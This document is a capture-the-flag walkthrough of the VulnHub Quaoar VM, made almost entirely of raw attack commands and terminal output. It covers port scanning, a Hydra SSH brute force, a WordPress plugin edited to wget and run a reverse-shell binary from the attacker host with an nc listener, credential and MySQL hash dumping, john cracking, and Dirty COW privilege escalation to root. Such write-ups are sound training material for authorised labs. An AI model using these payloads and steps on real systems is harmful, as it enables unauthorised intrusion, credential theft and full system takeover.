Download VM from
https://download.vulnhub.com/hackfest2016/Quaoar.ova

root@kali:~/Desktop# bash detailPortScan.sh 10.0.0.20
working on 10.0.0.20...
will be a while so relax ^^

unicornscan 10.0.0.20:1-65535
TCP: 22,53,80,110,139,143,445,993,995

nmap 10.0.0.20 -A -p 22,53,80,110,139,143,445,993,995

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-05 16:59 EDT
Nmap scan report for 10.0.0.20
Host is up (0.00042s latency).
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL CAPA SASL STLS TOP RESP-CODES PIPELINING
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-04-05T20:59:57+00:00; -3s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: STARTTLS LOGIN-REFERRALS OK ID have post-login SASL-IR IDLE LITERAL+ capabilities IMAP4rev1 listed ENABLE LOGINDISABLEDA0001 more Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-04-05T20:59:57+00:00; -3s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS OK ID have post-login SASL-IR IDLE LITERAL+ capabilities AUTH=PLAINA0001 listed ENABLE IMAP4rev1 more Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-04-05T20:59:56+00:00; -3s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: UIDL CAPA SASL(PLAIN) TOP USER RESP-CODES PIPELINING
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-04-05T20:59:56+00:00; -3s from scanner time.
MAC Address: 08:00:27:84:3B:B1 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP
|_  System time: 2017-04-05T16:59:56-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 10.0.0.20

Post-scan script results:
| clock-skew: 
|_  -3s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.84 seconds

unicornscan -mU 10.0.0.20:1-65535
UDP: 53,137,5353

nmap 10.0.0.20 -sU -A -p 53,137,5353

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-05 17:03 EDT
Nmap scan report for 10.0.0.20
Host is up (0.00043s latency).
PORT     STATE SERVICE    VERSION
53/udp   open  domain     ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
|_dns-recursion: Recursion appears to be enabled
137/udp  open  netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP)
5353/udp open  mdns       DNS-based service discovery
| dns-service-discovery: 
|   9/tcp workstation
|     Address=10.0.0.20 2605:e000:1124:112:a00:27ff:fe84:3bb1
|   65535/tcp libvirt
|_    Address=10.0.0.20 2605:e000:1124:112:a00:27ff:fe84:3bb1
MAC Address: 08:00:27:84:3B:B1 (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop
Service Info: Host: QUAOAR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms 10.0.0.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds

One way to get a foot hold

root@kali:~/Desktop# enum4linux 10.0.0.20
returned
nobody
viper
wpadmin
root

root@kali:~/Desktop# hydra -L ./20.user 10.0.0.20 ssh -e nsr
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-05 21:35:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 12 tasks per 1 server, overall 64 tasks, 12 login tries (l:4/p:3), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 10.0.0.20   login: wpadmin   password: wpadmin

$ bash -i
wpadmin@Quaoar:~$ netstat -antp
netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -               
tcp        0      0 10.0.0.20:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      -

found flag
wpadmin@Quaoar:~$ ls
flag.txt
wpadmin@Quaoar:~$ cat flag.txt
2bafe61f03117ac66a73c3c514de796e


Another way to get a foot hold

root@kali:~/Desktop# nikto -h http://10.0.0.20/
+ Server: Apache/2.2.22 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 00:00:10 2016
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3
+ Entry '/wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wordpress/: A Wordpress installation was found.
+ 8330 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2017-04-05 01:15:34 (GMT-4) (24 seconds)

root@kali:~/Desktop# dirb http://10.0.0.20 /usr/share/seclists/Discovery/Web_Content/big.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr  5 15:52:08 2017
URL_BASE: http://10.0.0.20/
WORDLIST_FILES: /usr/share/seclists/Discovery/Web_Content/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.0.0.20/ ----
+ http://10.0.0.20/LICENSE (CODE:200|SIZE:1672)                                                                                                    
+ http://10.0.0.20/cgi-bin/ (CODE:403|SIZE:285)                                                                                                    
+ http://10.0.0.20/hacking (CODE:200|SIZE:616848)                                                                                                  
+ http://10.0.0.20/index (CODE:200|SIZE:100)                                                                                                       
+ http://10.0.0.20/robots (CODE:200|SIZE:271)                                                                                                      
+ http://10.0.0.20/robots.txt (CODE:200|SIZE:271)                                                                                                  
+ http://10.0.0.20/server-status (CODE:403|SIZE:290)                                                                                               
==> DIRECTORY: http://10.0.0.20/upload/                                                                                                            
==> DIRECTORY: http://10.0.0.20/wordpress/                                                                                                         
                                                                                                                                                   
---- Entering directory: http://10.0.0.20/upload/ ----
==> DIRECTORY: http://10.0.0.20/upload/account/                                                                                                    
==> DIRECTORY: http://10.0.0.20/upload/admins/                                                                                                     
+ http://10.0.0.20/upload/config (CODE:200|SIZE:0) 


wpscan enum users got default credentials
root@kali:~/Desktop# wpscan -u http://10.0.0.20/wordpress/ -e u
[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+

**by default -e will enumerate "vt,tt,u,vp"
vulnerable plugin, timthumbs, users, vulnerable plugins so -e is sufficient

loginto wordpress with admin:admin
http://10.0.0.20/wordpress/wp-admin/

edit Dolly dummy plugin to include
echo shell_exec("cat /etc/passwd");
shell_exec("/usr/bin/wget http://10.0.0.14/rev-443 -O /tmp/rev-443");
shell_exec("/bin/chmod +x /tmp/rev-443");
echo shell_exec("ls -al /tmp");
echo shell_exec("/tmp/rev-443 &");

start nc

and activate plugin or run it at 
curl http://10.0.0.20/wordpress/wp-content/plugins/hello.php

root@kali:~/Desktop# nc -lnvp 443
listening on [any] 443 ...
connect to [10.0.0.14] from (UNKNOWN) [10.0.0.20] 36848
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash")'

www-data@Quaoar:/tmp$ uname -a
uname -a
Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux
www-data@Quaoar:/tmp$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
www-data@Quaoar:/tmp$ lscpu
lscpu
Architecture:          i686
CPU op-mode(s):        32-bit
Byte Order:            Little Endian
CPU(s):                1

www-data@Quaoar:/tmp$ find / -perm -2 -type f -ls 2>/dev/null | grep -v proc
find / -perm -2 -type f -ls 2>/dev/null | grep -v proc
408016    4 -rw-rw-rw-   1 www-data www-data     3441 Nov 30 00:02 /var/www/wordpress/wp-config.php

www-data@Quaoar:/tmp$ cat /var/www/wordpress/wp-config.php
cat /var/www/wordpress/wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');

www-data@Quaoar:/tmp$ mysql -u root -prootpassword! -D Lepton -e "select username, password from lep_users;"
<D Lepton -e "select username, password from lep_users;"                     
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
+----------+----------------------------------+

root@kali:~/Desktop# john lepton-admin.hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)

www-data@Quaoar:/tmp$ mysql -u root -prootpassword! -D mysql -e "select User, password from user;"
< -u root -prootpassword! -D mysql -e "select User, password from user;"     
+------------------+-------------------------------------------+
| User             | password                                  |
+------------------+-------------------------------------------+
| root             | *CBE70E8EFEC686415DAA1FDAD3366E4E3CBFB054 |
| root             | *E8F5222DC502C2BB34AFA3312E8C3A6B20725869 |
| root             | *E8F5222DC502C2BB34AFA3312E8C3A6B20725869 |
| root             | *E8F5222DC502C2BB34AFA3312E8C3A6B20725869 |
|                  |                                           |
|                  |                                           |
| debian-sys-maint | *FC9AC51985240558EC5476C1BC88CCD9F82D4D22 |
+------------------+-------------------------------------------+

www-data@Quaoar:/tmp$ mysql -u root -prootpassword! -D wordpress -e "select user_login, user_pass from wp_users;"
<D wordpress -e "select user_login, user_pass from wp_users;"                
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BAgwF1u99OZU1iqTgTIrUmBbtIjRMu1 |
| wpuser     | $P$BdcZZVb0ssMccLU1ECFCtUihocqQ0S. |
+------------+------------------------------------+

cat /etc/passwd | grep -v false
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:114:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:115:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
wpadmin:x:1001:1001::/home/wpadmin:/bin/sh

turns out root password in /var/www/wordpress/wp-config.php is really root password

root@kali:~/Desktop# ssh root@10.0.0.20
root@10.0.0.20's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Apr  5 17:12:43 EDT 2017

  System load:  0.0               Processes:             112
  Usage of /:   37.2% of 7.21GB   Users logged in:       0
  Memory usage: 42%               IP address for eth0:   10.0.0.20
  Swap usage:   2%                IP address for virbr0: 192.168.122.1

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Apr  5 17:12:27 2017 from 10.0.0.14
root@Quaoar:~# ls -al
total 48
drwx------  6 root root 4096 Nov 30 19:52 .
drwxr-xr-x 22 root root 4096 Oct  7 00:32 ..
drwx------  2 root root 4096 Oct  7 00:30 .aptitude
-rw-------  1 root root  373 Apr  5 17:11 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Oct 15 19:23 .cache
----------  1 root root   33 Oct 22 12:44 flag.txt
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
drwx------  2 root root 4096 Oct 26 20:50 .ssh
-rw-------  1 root root 4740 Nov 30 19:40 .viminfo
drwxr-xr-x  8 root root 4096 Jan 29  2015 vmware-tools-distrib
root@Quaoar:~# cat flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb

***********************or privesc with dirty.c****************

root@kali:~/Desktop/linuxRoot# wget https://www.exploit-db.com/download/40839 -O ./dirty.c
--2017-04-05 17:16:13--  https://www.exploit-db.com/download/40839
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5124 (5.0K) [application/txt]
Saving to: ‘./dirty.c’

./dirty.c                            100%[======================================================================>]   5.00K  --.-KB/s    in 0s      

2017-04-05 17:16:14 (40.2 MB/s) - ‘./dirty.c’ saved [5124/5124]

root@kali:~/Desktop/linuxRoot# nano -c ./dirty.c
root@kali:~/Desktop/linuxRoot# gcc -m32 -Wl,--hash-style=both -pthread dirty.c -lcrypt -o /var/www/html/dirty

wpadmin@Quaoar:~$ cd /tmp
wpadmin@Quaoar:/tmp$ wget http://10.0.0.14/dirty
--2017-04-05 17:17:58--  http://10.0.0.14/dirty
Connecting to 10.0.0.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9696 (9.5K)
Saving to: `dirty'

100%[==========================================================================================================>] 9,696       --.-K/s   in 0s      

2017-04-05 17:17:58 (105 MB/s) - `dirty' saved [9696/9696]

wpadmin@Quaoar:/tmp$ file dirty 
dirty: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x9f07dc40592b9e2c5c9d42abad21517de5529353, not stripped
wpadmin@Quaoar:/tmp$ chmod +x ./dirty 
wpadmin@Quaoar:/tmp$ ./dirty password 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: b76dd000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created
You can log in with username firefart and password password.


DON'T FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!

Done! Check /etc/passwd to see if the new user was created
You can log in with username firefart and password password.


DON'T FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!

wpadmin@Quaoar:/tmp$ su firefart
Password: 
firefart@Quaoar:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Quaoar:/tmp# cat /root/flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb